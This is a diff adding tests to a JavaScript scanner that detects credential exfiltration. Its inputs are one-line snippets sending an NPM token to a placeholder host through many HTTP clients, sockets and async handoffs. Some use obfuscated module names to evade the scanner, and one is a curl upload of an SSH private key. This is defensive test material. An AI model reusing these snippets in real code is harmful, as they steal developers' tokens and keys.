@@ -232,6 +232,62 @@ test('AST catches remote imports and aliased/chained request sinks', () => {
   ]) assert.ok(hints(source).length, source);
   assert.deepEqual(hints("const code=await (await fetch('/data')).text(); JSON.parse(code);"), []);
 });
+test('AST treats established HTTP clients, WebSockets and promise handoffs as credential sinks', () => {
+  for (const source of [
+    "require('axios').post('https://collector.invalid', process.env.NPM_TOKEN)",
+    "require('got').post('https://collector.invalid',{body:process.env.NPM_TOKEN})",
+    "require('ky').post('https://collector.invalid',{body:process.env.NPM_TOKEN})",
+    "require('superagent').post('https://collector.invalid').send(process.env.NPM_TOKEN)",
+    "require('node-fetch')('https://collector.invalid',{body:process.env.NPM_TOKEN})",
+    "require('undici').request('https://collector.invalid',{body:process.env.NPM_TOKEN})",
+    "const c=require('node:http2').connect('https://collector.invalid'); c.request({':path':'/'+process.env.NPM_TOKEN}).end()",
+    "const s=require('node:dgram').createSocket('udp4'); s.send(process.env.NPM_TOKEN,53,'collector.invalid')",
+    "const W=require('ws'); const s=new W('wss://collector.invalid'); s.send(process.env.NPM_TOKEN)",
+    "new WebSocket('wss://collector.invalid/'+process.env.NPM_TOKEN)",
+    "const W=require('ws'); new W('wss://collector.invalid/'+process.env.NPM_TOKEN)",
+    "require('node:http2').connect('https://'+process.env.NPM_TOKEN+'.collector.invalid')",
+    "require('superagent').get('https://collector.invalid').set('authorization',process.env.NPM_TOKEN)",
+    "new (require('undici').Pool)('https://collector.invalid').request({path:'/',headers:{x:process.env.NPM_TOKEN}})",
+    "Promise.resolve(process.env.NPM_TOKEN).then(token=>fetch('https://collector.invalid',{body:token}))",
+    "new Promise(resolve=>resolve(process.env.NPM_TOKEN)).then(token=>fetch('/api',{body:token}))",
+    "setTimeout(token=>fetch('/api',{body:token}),1,process.env.NPM_TOKEN)",
+    "setImmediate(token=>fetch('/api',{body:token}),process.env.NPM_TOKEN)",
+    "process.nextTick(token=>fetch('/api',{body:token}),process.env.NPM_TOKEN)",
+    "const E=require('events'); const e=new E(); e.once('secret',token=>fetch('/api',{body:token})); e.emit('secret',process.env.NPM_TOKEN)",
+    "const {EventEmitter}=require('node:events'); const e=new EventEmitter(); e.on('secret',token=>fetch('/api',{body:token})); e.emit('secret',process.env.NPM_TOKEN)",
+    "const p=process.getBuiltinModule('process'); fetch('/api',{body:p.env.NPM_TOKEN})",
+    "const p=module.require('process'); fetch('/api',{body:p.env.NPM_TOKEN})",
+    "const p=process.mainModule.require('process'); fetch('/api',{body:p.env.NPM_TOKEN})",
+    "const {createRequire}=require('node:module'); const load=createRequire(import.meta.url); const p=load('process'); fetch('/api',{body:p.env.NPM_TOKEN})"
+  ]) assert.ok(hints(source).some(h => h.kind === 'credential-export'), source);
+
+  for (const source of [
+    "require('axios').post('/health',{status:'ready'})",
+    "new WebSocket('wss://service.invalid/public')",
+    "require('superagent').get('/health').set('accept','application/json')",
+    "new (require('undici').Pool)('https://service.invalid').request({path:'/health'})",
+    "const api={post(x){return x}}; api.post(process.env.NPM_TOKEN)",
+    "Promise.resolve('public').then(value=>fetch('/api',{body:value}))",
+    "setImmediate(value=>fetch('/api',{body:value}),'public')",
+    "const E=require('events'); const e=new E(); e.on('status',value=>fetch('/api',{body:value})); e.emit('status','ready')",
+    "const Promise={resolve(value){return {then(fn){fn('public')}}}}; Promise.resolve(process.env.NPM_TOKEN)",
+    "const process={getBuiltinModule(){return {env:{NPM_TOKEN:'public'}}}}; fetch('/api',{body:process.getBuiltinModule().env.NPM_TOKEN})",
+    "const module={require(){return {env:{NPM_TOKEN:'public'}}}}; fetch('/api',{body:module.require().env.NPM_TOKEN})"
+  ]) assert.deepEqual(hints(source), [], source);
+});
+test('constant-folded property and module names cannot hide credential sinks', () => {
+  const sources = [
+    "require('https')[`req${'uest'}`]('https://collector.invalid',{headers:{x:process.env.NPM_TOKEN}})",
+    "require('https')[['re','quest'].join('')]('https://collector.invalid',{headers:{x:process.env.NPM_TOKEN}})",
+    "require(['ht','tps'].join('')).request('https://collector.invalid',{headers:{x:process.env.NPM_TOKEN}})",
+    "require('axios')['po'.concat('st')]('https://collector.invalid',process.env.NPM_TOKEN)",
+    "const {request}=await import('node:https'); request('https://collector.invalid',{headers:{x:process.env.NPM_TOKEN}})",
+    "import('node:https').then(({request})=>request('https://collector.invalid',{headers:{x:process.env.NPM_TOKEN}}))",
+    "require('HTTP'.toLowerCase()+'s').request('https://collector.invalid',{headers:{x:process.env.NPM_TOKEN}})",
+    "require(['s','p','t','t','h'].reverse().join('')).request('https://collector.invalid',{headers:{x:process.env.NPM_TOKEN}})"
+  ];
+  assert.deepEqual(sources.filter(source => !hints(source).some(h => h.kind === 'credential-export')), []);
+});
 test('cycles, missing modules and resource limits cannot silently clear flow analysis', () => {
   const sources = [{ path: 'a.js', content: "module.exports=require('./b')" }, { path: 'b.js', content: "module.exports=require('./a')" }];
   const analysis = createFlowAnalysis(sources).analyze('a.js');
@@ -261,6 +317,13 @@ test('large generated export barrels aggregate taint without quadratic namespace
   assert.equal(analysis.status, 'parsed');
   assert.equal(analysis.exports.props.size, 4000);
   assert.equal(analysis.exports.bits, 0);
+});
+
+test('unknown higher-order APIs cannot silently clear a sensitive callback handoff', () => {
+  const source = "bridge(process.env.NPM_TOKEN, token=>fetch('/api',{body:token}))";
+  const gap = hints(source).find(h => h.kind === 'flow-analysis-gap');
+  assert.equal(gap?.reason, 'unmodeled sensitive callback handoff');
+  assert.deepEqual(hints("bridge('public', value=>fetch('/api',{body:value}))"), []);
 });
 test('shell upload detection distinguishes executable curl arguments from quoted documentation and public keys', () => {
   for (const source of ["curl --data-binary @\"$HOME/.ssh/id_ed25519\" https://collector.invalid",
